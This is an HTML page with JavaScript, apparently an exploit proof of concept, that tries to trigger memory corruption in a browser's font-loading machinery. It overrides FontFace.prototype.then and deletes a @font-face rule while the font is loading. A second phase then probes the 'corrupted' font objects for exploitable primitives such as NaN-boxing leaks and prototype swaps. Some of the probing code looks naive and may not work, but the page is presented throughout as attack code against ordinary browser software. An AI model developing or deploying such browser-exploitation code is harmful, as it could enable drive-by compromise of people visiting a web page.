<!DOCTYPE html>
<html>
<head></head>
<body>
<h1 id="status">Ready</h1>
<button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN EXPLOIT</button>
<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre; border: 1px solid white; padding: 5px; margin: 5px; max-height: 80vh; overflow-y: scroll;"></div>

<script>
let phase = 0;
let corruptedFonts = [];

function log(msg) {
    let d = document.getElementById('log');
    if (d) d.textContent += msg + '\n';
}

function hex(n) {
    if (typeof n === 'number') {
        return '0x' + n.toString(16).padStart(8, '0');
    }
    return String(n);
}

function u32(f64) {
    let buf = new ArrayBuffer(8);
    let f64_view = new Float64Array(buf);
    let u32_view = new Uint32Array(buf);
    f64_view[0] = f64;
    return [u32_view[0], u32_view[1]];
}

function runExploit() {
    phase++;
    
    if (phase === 1) {
        // Phase 1: Corruption (will OOM)
        document.getElementById('status').textContent = 'Phase 1: Corrupting...';
        log('[PHASE 1] Triggering corruption\n');
        
        let style = document.createElement('style');
        style.id = 's';
        style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(style);
        
        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(A);
        void A.loaded;
        
        let fired = false;
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!fired && this === A) {
                    fired = true;
                    
                    // Create MANY corrupted fonts to increase chances
                    for (let i = 0; i < 20; i++) {
                        let f = new FontFace('corrupt' + i, 'local(Helvetica)', {
                            unicodeRange: 'U+' + (0x41 + i).toString(16)
                        });
                        corruptedFonts.push(f);
                    }
                    
                    document.getElementById('s').sheet.deleteRule(0);
                    document.body.offsetTop;
                    
                    window.corruptedFonts = corruptedFonts;
                }
                return undefined;
            }
        });
        
        document.fonts.load('1em x', 'AB');
        log('Click again for Phase 2');
        
    } else if (phase === 2) {
        // Phase 2: Deep exploitation
        document.getElementById('status').textContent = 'Phase 2: Exploiting...';
        log('[PHASE 2] Deep memory exploitation\n');
        
        let fonts = window.corruptedFonts;
        if (!fonts || fonts.length === 0) {
            log('[ERROR] No corrupted fonts!');
            return;
        }
        
        log('[*] Found ' + fonts.length + ' corrupted fonts\n');
        
        // === TEST 1: Look for NaN boxing leaks ===
        log('[TEST 1] NaN boxing leak attempt:');
        try {
            let leak_arr = [];
            
            for (let i = 0; i < fonts.length; i++) {
                let f = fonts[i];
                
                // Store font in array alongside floats
                leak_arr.push(f);
                leak_arr.push(1.1);
                leak_arr.push(2.2);
            }
            
            // Try to read back as Float64Array
            let float_view = new Float64Array(leak_arr.length);
            for (let i = 0; i < leak_arr.length; i++) {
                if (typeof leak_arr[i] === 'number') {
                    float_view[i] = leak_arr[i];
                }
            }
            
            // Look for unusual patterns
            for (let i = 0; i < 10 && i < float_view.length; i++) {
                let parts = u32(float_view[i]);
                log('  [' + i + '] ' + float_view[i] + ' = ' + hex(parts[0]) + ' ' + hex(parts[1]));
            }
            
        } catch(e) {
            log('  Error: ' + e.message);
        }
        
        // === TEST 2: Property descriptor manipulation ===
        log('\n[TEST 2] Property descriptor leak:');
        try {
            let f = fonts[0];
            
            // Get all property descriptors
            let desc = Object.getOwnPropertyDescriptors(f);
            for (let key in desc) {
                log('  ' + key + ': ' + JSON.stringify(desc[key]));
            }
            
        } catch(e) {
            log('  Error: ' + e.message);
        }
        
        // === TEST 3: Prototype chain corruption ===
        log('\n[TEST 3] Prototype manipulation:');
        try {
            let f = fonts[0];
            let proto = Object.getPrototypeOf(f);
            
            log('  prototype: ' + proto);
            log('  prototype.constructor.name: ' + proto.constructor.name);
            
            // Try to replace prototype
            let fake_proto = {
                leakProp: 0x4141414141414141
            };
            
            try {
                Object.setPrototypeOf(f, fake_proto);
                log('  Set fake prototype!');
                log('  f.leakProp: ' + hex(f.leakProp));
            } catch(e) {
                log('  Cannot set prototype: ' + e.message);
            }
            
        } catch(e) {
            log('  Error: ' + e.message);
        }
        
        // === TEST 4: WeakMap side-channel ===
        log('\n[TEST 4] WeakMap leak attempt:');
        try {
            let wm = new WeakMap();
            
            for (let i = 0; i < fonts.length; i++) {
                wm.set(fonts[i], i);
            }
            
            // Try to trigger rehash
            for (let i = 0; i < 100; i++) {
                let obj = {};
                wm.set(obj, i + 1000);
            }
            
            // Check if corrupted fonts still retrievable
            for (let i = 0; i < Math.min(5, fonts.length); i++) {
                let val = wm.get(fonts[i]);
                log('  fonts[' + i + '] WeakMap value: ' + val);
            }
            
        } catch(e) {
            log('  Error: ' + e.message);
        }
        
        // === TEST 5: Regex engine interaction ===
        log('\n[TEST 5] RegExp engine:');
        try {
            let f = fonts[0];
            let str = String(f);
            log('  String(font): ' + str);
            
            // Try to match internal representation
            let match = str.match(/0x([0-9a-fA-F]+)/);
            if (match) {
                log('  Found hex in string: ' + match[0]);
            }
            
            // Try toString on different fonts
            for (let i = 0; i < Math.min(3, fonts.length); i++) {
                log('  fonts[' + i + '].toString(): ' + fonts[i].toString());
            }
            
        } catch(e) {
            log('  Error: ' + e.message);
        }
        
        log('\n[PHASE 2] Complete');
        log('Analyzing output for exploitable primitives...');
    }
}

log('Click button to start');
</script>
</body>
</html>
